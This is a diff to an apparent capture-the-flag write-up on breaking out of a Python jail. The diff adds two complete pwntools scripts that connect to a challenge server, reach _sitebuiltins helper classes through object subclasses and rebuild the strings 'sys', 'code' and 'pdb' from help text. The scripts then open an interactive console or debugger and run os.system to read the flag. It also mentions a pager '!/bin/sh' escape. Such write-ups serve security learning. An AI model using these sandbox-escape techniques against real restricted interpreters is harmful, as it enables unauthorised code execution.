@@ -150,8 +150,8 @@ help>
 
 So the first step is done. Actually, if pager is available (e.g. locally), we can get shell using `!/bin/sh` in pager:
 
-```
-python3
+```shell
+$ python3
 Python 3.13.5 (main, Jun 25 2025, 18:55:22) [GCC 14.2.0] on linux
 Type "help", "copyright", "credits" or "license" for more information.
 Ctrl click to launch VS Code Native REPL
@@ -270,7 +270,7 @@ import os
 os.system("cat flag.txt")
 ```
 
-Attack script
+Attack script:
 
 ```python
 from pwn import *
@@ -298,9 +298,196 @@ p.sendline(b"os.system(\"cat flag.txt\")")
 p.interactive()
 ```
 
+Fully automated attack script to generate the indices:
+
+```python
+from pwn import *
+
+context(log_level="debug")
+
+p = remote("0.cloud.chals.io", 33618)
+p.recvuntil(b">> ")
+p.sendline(b"().__class__.__base__.__subclasses__()")
+res = p.recvline().decode()
+
+helper_index = res.split(", ").index("<class '_sitebuiltins._Helper'>")
+printer_index = res.split(", ").index("<class '_sitebuiltins._Printer'>")
+print("Helper", helper_index)
+print("Printer", printer_index)
+
+# A is 10, B is 100
+
+
+def get_index(index):
+    if index % 10 <= 5:
+        parts = (
+            ["True"] * (index % 10)
+            + ["A"] * (index // 10 % 10)
+            + ["B"] * (index // 100 % 10)
+        )
+        return "+".join(parts)
+    else:
+        parts = ["A"] * (index // 10 % 10 + 1) + ["B"] * (
+            index // 100 % 10
+        )
+        return "+".join(parts) + "-" + "-".join(["True"] * (10 - index % 10))
+
+
+# H for index of helper
+helper = get_index(helper_index)
+print(helper)
+
+p.recvuntil(b">> ")
+p.sendline(
+    b"[A:=True+True+True+True+True+True+True+True+True+True,B:=A*A,H:="
+    + helper.encode()
+    + b",().__class__.__base__.__subclasses__()[H]()()]"
+)
+p.recvuntil(b"help> ")
+p.sendline(b"code")
+p.recvuntil(b"help> ")
+p.sendline(b"quit")
+
+# find help text of helper
+p.recvuntil(b">> ")
+p.sendline(
+    b"[A:=True+True+True+True+True+True+True+True+True+True,B:=A*A,H:="
+    + helper.encode()
+    + b",S:=().__class__.__base__.__subclasses__()[H].__doc__]"
+)
+help_text = eval(p.recvline().decode())[-1]
+
+# P for index of printer
+
+printer = get_index(printer_index)
+print(printer)
+
+
+# synthesize "sys" and "code"
+def synthesize(text):
+    res = []
+    for ch in text:
+        index = help_text.index(ch)
+        res.append("S[" + get_index(index) + "]")
+    return "+".join(res)
+
+
+p.recvuntil(b">> ")
+p.sendline(
+    b"[A:=True+True+True+True+True+True+True+True+True+True,B:=A*A,H:="
+    + helper.encode()
+    + b",P:="
+    + printer.encode()
+    + b",S:=().__class__.__base__.__subclasses__()[H].__doc__,().__class__.__base__.__subclasses__()[P].__init__.__globals__["
+    + synthesize("sys").encode()
+    + b"].modules["
+    + synthesize("code").encode()
+    + b"].InteractiveConsole().interact()]"
+)
+p.recvuntil(b">>> ")
+p.sendline(b"import os")
+p.sendline(b'os.system("cat flag.txt")')
+p.interactive()
+```
+
 ### Use pdb module
 
-TODO
+The attack using pdb is similar: we only need to call `pdb.set_trace()`:
+
+```python
+from pwn import *
+
+context(log_level="debug")
+
+p = remote("0.cloud.chals.io", 33618)
+p.recvuntil(b">> ")
+p.sendline(b"().__class__.__base__.__subclasses__()")
+res = p.recvline().decode()
+
+helper_index = res.split(", ").index("<class '_sitebuiltins._Helper'>")
+printer_index = res.split(", ").index("<class '_sitebuiltins._Printer'>")
+print("Helper", helper_index)
+print("Printer", printer_index)
+
+# A is 10, B is 100
+
+
+def get_index(index):
+    if index % 10 <= 5:
+        parts = (
+            ["True"] * (index % 10)
+            + ["A"] * (index // 10 % 10)
+            + ["B"] * (index // 100 % 10)
+        )
+        return "+".join(parts)
+    else:
+        parts = ["A"] * (index // 10 % 10 + 1) + ["B"] * (index // 100 % 10)
+        return "+".join(parts) + "-" + "-".join(["True"] * (10 - index % 10))
+
+
+# H for index of helper
+helper = get_index(helper_index)
+print(helper)
+
+p.recvuntil(b">> ")
+p.sendline(
+    b"[A:=True+True+True+True+True+True+True+True+True+True,B:=A*A,H:="
+    + helper.encode()
+    + b",().__class__.__base__.__subclasses__()[H]()()]"
+)
+p.recvuntil(b"help> ")
+p.sendline(b"pdb")
+p.recvuntil(b"help> ")
+p.sendline(b"quit")
+
+# find help text of helper
+p.recvuntil(b">> ")
+p.sendline(
+    b"[A:=True+True+True+True+True+True+True+True+True+True,B:=A*A,H:="
+    + helper.encode()
+    + b",S:=().__class__.__base__.__subclasses__()[H].__doc__]"
+)
+help_text = eval(p.recvline().decode())[-1]
+
+# P for index of printer
+
+printer = get_index(printer_index)
+print(printer)
+
+
+# synthesize "sys" and "pdb"
+def synthesize(text):
+    res = []
+    for ch in text:
+        index = help_text.index(ch)
+        res.append("S[" + get_index(index) + "]")
+    return "+".join(res)
+
+
+p.recvuntil(b">> ")
+p.sendline(
+    b"[A:=True+True+True+True+True+True+True+True+True+True,B:=A*A,H:="
+    + helper.encode()
+    + b",P:="
+    + printer.encode()
+    + b",S:=().__class__.__base__.__subclasses__()[H].__doc__,().__class__.__base__.__subclasses__()[P].__init__.__globals__["
+    + synthesize("sys").encode()
+    + b"].modules["
+    + synthesize("pdb").encode()
+    + b"].set_trace()]"
+)
+p.recvuntil(b"(Pdb) ")
+p.sendline(
+    (
+        '().__class__.__base__.__subclasses__()['
+        + str(printer_index)
+        + '].__init__.__globals__["sys"].modules["os"].system("cat flag.txt")'
+    ).encode()
+)
+p.interactive()
+```
+
+Adapt the script above to load `pdb` module instead. Then, we can execute what we want freely.
 
 ## Explain the writeups above
 
